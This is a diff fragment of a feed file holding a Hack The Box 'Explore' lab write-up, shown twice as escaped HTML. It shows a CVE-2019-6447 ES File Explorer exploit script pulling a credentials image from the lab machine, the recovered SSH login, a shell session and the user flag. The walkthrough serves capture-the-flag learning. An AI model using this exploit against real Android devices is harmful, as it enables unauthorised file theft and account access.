+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 124.88 KB (127,876 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|                Coded By : Nehal a.k.a PwnerSec                 |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Downloading file...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Done. Saved as `out.dat`.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The image contains:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kristi
 Kr1sT!5h@Rp3xPl0r3!
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the credentials for ssh. Connecting through ssh&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;ssh kristi@10.10.10.247 -p 2222          
-The authenticity of host &#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&#39; can&#39;t be established.
-RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;[10.10.10.247]:2222&#39; (RSA) to the list of known hosts.
-Password authentication
-Password:
-:/ $ ls
-acct                   init.superuser.rc       sbin
-bin                    init.usb.configfs.rc    sdcard
-bugreports             init.usb.rc             sepolicy
-cache                  init.zygote32.rc        storage
-charger                init.zygote64_32.rc     sys
-config                 lib                     system
-d                      mnt                     ueventd.android_x86_64.rc
-data                   odm                     ueventd.rc
-default.prop           oem                     vendor
-dev                    plat_file_contexts      vendor_file_contexts
-etc                    plat_hwservice_contexts vendor_hwservice_contexts
-fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
-init                   plat_seapp_contexts     vendor_seapp_contexts
-init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
-init.environ.rc        proc                    vndservice_contexts
-init.rc                product
-:/ $ whoami
-u0_a76
-:/ $ cd s
-sbin/     sdcard/   sepolicy  storage/  sys/      system/
-:/ $ cd sdcard/
-:/sdcard $ ls
-Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
-Android Download Music  Pictures      Ringtones dianxinos
-:/sdcard $ ca
-cal             cameraserver    case            cat             catv
-:/sdcard $ cat user.txt
-f32017174c7c7e8f50c6da52891ae250
-&lt;/code&gt;&lt;/pre&gt;</content>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh kristi@10.10.10.247 -p 2222          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The authenticity of host &amp;#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&amp;#39; can&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: Permanently added &amp;#39;[10.10.10.247]:2222&amp;#39; (RSA) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;acct                   init.superuser.rc       sbin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bin                    init.usb.configfs.rc    sdcard
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bugreports             init.usb.rc             sepolicy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cache                  init.zygote32.rc        storage
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;charger                init.zygote64_32.rc     sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;config                 lib                     system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d                      mnt                     ueventd.android_x86_64.rc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data                   odm                     ueventd.rc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;default.prop           oem                     vendor
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dev                    plat_file_contexts      vendor_file_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;etc                    plat_hwservice_contexts vendor_hwservice_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init                   plat_seapp_contexts     vendor_seapp_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.environ.rc        proc                    vndservice_contexts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init.rc                product
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;u0_a76
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ cd s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sbin/     sdcard/   sepolicy  storage/  sys/      system/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/ $ cd sdcard/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Android Download Music  Pictures      Ringtones dianxinos
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ ca
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cal             cameraserver    case            cat             catv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f32017174c7c7e8f50c6da52891ae250
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
   </channel>
